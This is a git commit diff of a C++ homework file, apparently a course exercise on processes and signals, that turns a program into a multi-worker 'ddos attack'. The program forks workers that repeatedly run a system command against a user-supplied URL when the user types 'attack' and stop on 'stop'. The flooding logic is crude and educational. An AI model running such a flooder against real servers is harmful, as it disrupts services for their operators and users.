e3c46ed46bd6282380aa0b9d76c3e79af44681d9
John <john.kraft@western.edu>
2020-04-28 16:54:34 -0600

    ddos attack working with multiple workers

--- hw14/ddos.cpp
+++ hw14/ddos.cpp
@@ -16,13 +16,20 @@ void worker(int sig){
 		s = x * s;
 		usleep(1000*s);
 		system(u);
-		printf("%d: sending request\n", sig);
+		fprintf(stderr, "%d: sending request\n", getpid());
 	}
 }
 
 void stop(int sig){
 	_exit(3);
 }
+
+void waitfunc(int procs, pid_t* rv){
+	for(int i = 0; i < procs; i++){
+		wait(NULL);
+	}
+}
+		
 
 int main(int argc, char **argv){
 	if(argc != 4){
@@ -39,63 +46,43 @@ int main(int argc, char **argv){
 		printf("Enter in a valid MaxSleepTime");
 		exit(1);
 	}
+
 	url = argv[3];
 	int procs = atoi(argv[1]);
 	if(procs <= 0) {
 		printf("Enter a valid number of processes\n");
 		exit(1);
 	}
-/*
+	
+	pid_t *rv = (pid_t*) malloc(sizeof(pid_t) * procs);
+		
+	for(int i = 0; i < procs; i++){
+		pid_t retval = fork();
+		if(retval == 0){
+			signal(SIGUSR1, worker);
+			signal(SIGUSR2, stop);
+			while(true){pause();}
+		} else if(retval > 0){	
+			rv[i] = retval;
+			setpgid(retval,rv[0]);
+		}
+	}
+
 	char attack[8];
 	while(scanf("%7s", attack)){
 		if(strcmp(attack, "attack") == 0){
 			break;
 		} else{printf("INVALID REQUEST\n");}
 	}
-*/
-//	int *rv = (int*) malloc(sizeof(int) * procs);
+	kill(-rv[0], SIGUSR1);
 
-	for(int i = 0; i < procs; i++){
-		pid_t retval = fork();
-		if(retval == 0){
-			signal(SIGUSR1, worker);
-			signal(SIGUSR2, stop);
-			while(true) pause();
-		} else if(retval > 0){			
-			char stp[5];
-			//rv[i] = retval;
-			char attack[8];
-			while(scanf("%7s", attack)){
-				if(strcmp(attack, "attack") == 0){
-					break;
-				} else{printf("INVALID REQUEST\n");}
-			}
-			if(kill(retval, SIGUSR1) < 0) {
-				perror("kill error\n");
-				exit(1);
-			}	
-			while(scanf("%4s", stp)){
-				if(strcmp(stp, "stop") == 0){
-					break;
-				}else{printf("INVALID REQUEST\n");}
-			}		
-			kill(retval, SIGUSR2);
-			wait(NULL);
-		}
-
-	}
-/*
 	char stp[5];
 	while(scanf("%4s", stp)){
 		if(strcmp(stp, "stop") == 0){
 			break;
-		}else{printf("INVALID REQUEST\n");}
+		} else{printf("INVALID REQUEST\n");}
 	}
-	
-	for(int k = 0; k < procs; k++) {
-		kill(rv[k], SIGUSR2);
-		wait(NULL);
-	}
-*/
+	kill(-rv[0], SIGUSR2);
+	waitfunc(procs, rv);
 }
 
